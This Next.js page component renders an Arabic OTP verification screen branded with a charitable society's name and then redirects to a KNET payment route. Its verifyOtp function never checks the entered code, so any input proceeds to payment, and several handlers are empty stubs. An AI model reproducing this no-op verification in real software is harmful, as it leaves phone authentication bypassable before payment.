/* eslint-disable */

'use client'

import { useState, useEffect } from "react"
import Image from "next/image"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"

export default function OtpVerification() {
  const router = useRouter()
  
  const [otp, setOtp] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [timeLeft, setTimeLeft] = useState(120) // 2 minutes in seconds
  const [canResend, setCanResend] = useState(false)
  
  // Format time as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
  }
  
  // Handle OTP input change
  const handleOtpChange = (value: string) => {
    // Only allow numbers
    
    setOtp(value)
    
    // Auto-focus next input
  }
  
 
  
  // Handle paste
 
  // Verify OTP
  const verifyOtp = async () => {
    
    setIsLoading(true)
    
    try {
      // In a real app, you would verify the OTP with your backend
      // For this example, we'll simulate a successful verification with "1234"
       
        
        // Redirect to KNET payment page
        setTimeout(() => {
          router.push('/knet-payment')
        }, 1500)
       
    } catch (error) {
      console.error("Error verifying OTP:", error)
      
    } finally {
      setIsLoading(false)
    }
  }
  
  // Resend OTP
  const resendOtp = () => {
    if (!canResend) return
    
    setIsLoading(true)
    
    // In a real app, you would call your backend to resend the OTP
    setTimeout(() => {
      setTimeLeft(120) // Reset timer
      setCanResend(false)
      
     
      
      setIsLoading(false)
    }, 1000)
  }
  
  // Timer countdown
  useEffect(() => {
    if (timeLeft <= 0) {
      setCanResend(true)
      return
    }
    
    const timer = setTimeout(() => {
      setTimeLeft(timeLeft - 1)
    }, 1000)
    
    return () => clearTimeout(timer)
  }, [timeLeft])
  
  return (
    <div className="flex flex-col min-h-screen bg-gray-50 text-right" dir="rtl">
      {/* Header */}
      <header className="bg-[#0a3b4d] text-white p-4 flex justify-between items-center">
        <div className="flex items-center gap-4">
          <Link href="/" className="flex items-center">
            <Image 
              src="/placeholder.svg?height=40&width=40" 
              alt="Logo" 
              width={40} 
              height={40} 
              className="rounded-full"
            />
            <span className="mr-2 hidden md:inline">الجمعية الخيرية الإسلامية</span>
          </Link>
        </div>
        <div className="flex items-center gap-2">
          <Link href="#" className="text-sm hover:underline">تسجيل دخول</Link>
          <span>|</span>
          <Link href="#" className="text-sm hover:underline">En</Link>
        </div>
      </header>

      <main className="flex-1 max-w-md mx-auto w-full p-4 py-12 flex items-center justify-center">
        <Card className="w-full">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl">التحقق من رقم الهاتف</CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="text-center">
              <p className="mb-2">تم إرسال رمز التحقق إلى رقم الهاتف</p>
              <p className="font-bold">+965 **** 1234</p>
            </div>
            
            <div className="space-y-4">
              <div className="flex justify-center gap-2 dir-ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={otp}
                    onChange={(e) => handleOtpChange( e.target.value)}
                    className="w-full h-14 text-center text-2xl"
                  />
              </div>
              
              <div className="text-center">
                {!canResend ? (
                  <p className="text-sm text-muted-foreground">
                    يمكنك إعادة إرسال الرمز خلال {formatTime(timeLeft)}
                  </p>
                ) : (
                  <Button
                    variant="link"
                    onClick={resendOtp}
                    disabled={isLoading || !canResend}
                    className="text-primary p-0 h-auto"
                  >
                    إعادة إرسال الرمز
                  </Button>
                )}
              </div>
            </div>
          </CardContent>
          <CardFooter className="flex flex-col gap-4">
            <Button 
              onClick={verifyOtp} 
              className="w-full bg-orange-500 hover:bg-orange-600"
              disabled={isLoading}
            >
              {isLoading ? "جاري التحقق..." : "تحقق"}
            </Button>
            
            <Button 
              variant="outline" 
              onClick={() => router.back()}
              disabled={isLoading}
              className="w-full"
            >
              رجوع
            </Button>
          </CardFooter>
        </Card>
      </main>
    
    </div>
  )
}
